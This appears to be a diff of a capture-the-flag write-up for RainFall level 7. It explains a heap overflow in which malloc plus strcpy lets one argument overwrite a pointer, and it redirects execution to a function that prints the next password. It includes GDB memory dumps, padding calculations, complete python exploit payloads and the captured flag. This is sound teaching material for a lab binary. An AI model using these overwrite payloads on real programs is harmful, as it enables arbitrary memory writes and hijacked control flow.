@@ -1,131 +1,98 @@
 ## LEVEL 7
+---
+### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
+---
+This level has longer and more complex assembly code than the previous levels.
+I won't show the major parts of the code, but you can still find a fully explained version of the code in [this file](./asm/level7.asm), or a C version in [this file](./src/level7.c).
 
-This level is rather complicated, so i will use `Ghidra` to firstly translate the program in C.
+This level uses the same logic as the previous level.
+The main part to understand is the vulnerability caused by the combination of using `malloc` and `strcpy`.
+Although the vulnerability is linked to `strcpy`, a similar attack can be used with the values stored inside the stack.
 
+First thing to notice is the usage of malloc who looks like this *(pseudo C code)* :
 ```c
-char c[68];
-
-void
-m (void) {
-	time_t tVar1;
-
-	tVar1 = time((time_t *)0);
-	printf("%s - %d\n", c, tVar1);
-	return;
-}
-
-int
-main (int ac, char **av) {
-	int		*s1;
-	int		*s2;
-
-	s1 = malloc(8);
-	s1[0] = 1;
-	s1[1] = malloc(8);
-	s2 = malloc(8);
-	s2[0] = 2;
-	s2[1] = malloc(8);
-
-	strcpy((char *)s1[1], av[1]);
-	strcpy((char *)s2[1], av[2]);
-	fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
-	puts("~~");
-	return (0);
-}
+ptr1 = malloc(8);
+*(ptr1) = 1;
+*(ptr1 + 4) = malloc(8);
+ptr2 = malloc(8);
+*(ptr2) = 2;
+*(ptr2 + 4) = malloc(8);
 ```
+In the previous level, I explained that `malloc` allocates a larger size of memory than requested and then splits this memory into smaller parts to avoid heavy system calls like `mmap` or `sbrk`.
+Based on this information, I predict that these four pointers are located together in memory.
+But I need to be sure, so I will use `gdb` to check the addresses of these pointers.
 
-Now that we have a better compression of this program, we can understand what this code does ? Firstly we see a bunch of `malloc()`, so i will use `GDB` to see what happen in the memory.
+```bash
+(gdb) b *0x08048599
+Breakpoint 1 at 0x8048599
+(gdb) r
+Starting program: /home/user/level7/level7
 
-```shell
-level7@RainFall:~$ gdb -q level7
-Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
-(gdb) b *0x080485ba
-Breakpoint 1 at 0x80485ba
-(gdb) b *0x0804859d
-Breakpoint 2 at 0x804859d
-(gdb) b *0x080485d3
-Breakpoint 3 at 0x80485d3
-(gdb) r $(python -c 'print("A"*8)') $(python -c 'print("B"*8)')
-Starting program: /home/user/level7/level7 $(python -c 'print("A"*8)') $(python -c 'print("B"*8)')
-
-Breakpoint 2, 0x0804859d in main ()
-(gdb) x/32x $eax - 16
+Breakpoint 1, 0x08048599 in main ()
+(gdb) x/4a $esp+24
+0xbffff728:	0x804a028	0x804a008	0x8048610 <__libc_csu_init>	0x0
+(gdb) x/32x 0x804a008
 0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
 0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
 0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
 0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
 
-Perfect now that we have a better understanding of the memory, we know that the first `strcpy()` will write on the address `0x0804a018` and the second `strcpy()` will write on the address `0x0804a038`. So if we overflow the first `strcpy()` to change the address `0x0804a038` we can ask to `strcpy()` to write on the address we want.
+We can see that the four pointers are located together in memory.
+But even if the program asks for 8 bytes `malloc` gives them 16 bytes. This is because of the alignment of the memory.
+The memory is aligned on 16 bytes, so `malloc` will always return a pointer aligned on 16 bytes.
 
-We've seen previously that we `puts()` function use a GOT jump, so if we change the jump address with the function `m()` we can launch the function then `printf()` the stream with our flag.
+The second thing I notice is the usage of `strcpy` to copy the user input into the memory allocated by `malloc`.
+This is the vulnerability. `strcpy` doesn't check the size of the destination buffer, so it will copy the user input until it finds a null byte.
+This means that if the user input is larger than the allocated memory, `strcpy` will write outside of the allocated memory.
 
-But to create our payload, we need some informations.
-
----
-
-#### Padding
-
-The padding is the space between the address given to `strdup()` and our target address. In our case, this is the distance between `0x804a018` and `0x804a02c`.
-
-`0x804a02c - 0x804a018 = 0x14 -> 20`
-
----
-
-#### `puts()` jump address
-
-```shell
-(gdb) i func
-All defined functions:
-
-Non-debugging symbols:
-[...]
-0x08048400  puts
-0x08048400  puts@plt
-[...]
-(gdb) disas 0x08048400
-Dump of assembler code for function puts@plt:
-   0x08048400 <+0>:	jmp    *0x8049928
-   0x08048406 <+6>:	push   $0x28
-   0x0804840b <+11>:	jmp    0x80483a0
-End of assembler dump.
+```c
+strcpy(*(ptr1 + 1), argv[1]);
+strcpy(*(ptr2 + 1), argv[2]);
 ```
 
-`puts()` jump address is : `0x8049928`
+`strcpy` takes the address at `(ptr + 1)` and writes to that address. In our case, it will take the address `0x0804a018` and write to that address.
 
----
+Perfect, we have all the information we need to exploit this program. We know that `strcpy` can overwrite memory if it doesn't encounter a NULL byte.
+Therefore, if the first `strcpy` overwrites the address at `(ptr2 + 1)`, which is `0x0804a038`, the second `strcpy` can write any value we want at that address.
 
-#### `m()` address
+Oh, I almost forgot to mention how we will obtain the flag. In the program, we have a function called `m` that takes a global string where the flag is stored at the end of the program, and it prints the flag. 
+Therefore, we need to overwrite the address of the global string with the address of the `m` function.
 
-```shell
-(gdb) i func
-All defined functions:
+Now it's time to gather the information for our payload.
+First, we need to determine where to write the address for overwriting.
+We observed with GDB that the first string is written at `0x804a018` and the second address is stored at `0x804a028 + 4`.
+Therefore, the distance between these two addresses is `0x804a028 + 4 - 0x804a018 = 0x14`.
+This means that we need to write 20 bytes in order to overwrite the second address.
 
-Non-debugging symbols:
-[...]
-0x080484f4  m
-[...]
+Now we need an address to overwrite, and this address must be a reference to a `jmp` instruction. There are two options you can consider:
+
+1. The first address you can use is the return value of the `main` function, which is stored at `ebp + 4` (e.g., `0xbffff73c`).
+
+2. Alternatively, you can use the address of the `jmp` instruction in the `puts` function, which is stored at `0x8049928`.
+
+In my case, I mentioned that I will use the address of the `main` function's return value.
+
+Additionally, we need the address of the `m` function, which is `0x080484f4`.
+
+With these details, we can now create our payload in the following structure:
+
 ```
+argv[1] = {
+    20 bytes of padding to overwrite the second address
+    +
+    address to change
+}
 
-`m()` address is : `0x080484f4`
-
----
-
-### Payload
-
-`python -c 'print "\x90" * 20 + "\x28\x99\x04\x08"' > /tmp/payload_1`
-
-`python -c 'print "\xf4\x84\x04\x08"' > /tmp/payload_2`
-
-We just have to set the payload as parameter to get the flag.
-
-```shell
-level7@RainFall:~$ ./level7 $(cat /tmp/payload_1) $(cat /tmp/payload_2)
+argv[2] = {
+    address of the m function
+}
+```
+Here is our final payload executed:
+```bash
+$ ./level7 `python -c 'print "A"*20 + "\x3c\xf7\xff\xbf"'` `python -c 'print "\xf4\x84\x04\x08"'`
+~~
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - 1657910055
+ - 1684416496
+Segmentation fault (core dumped)
 ```
-
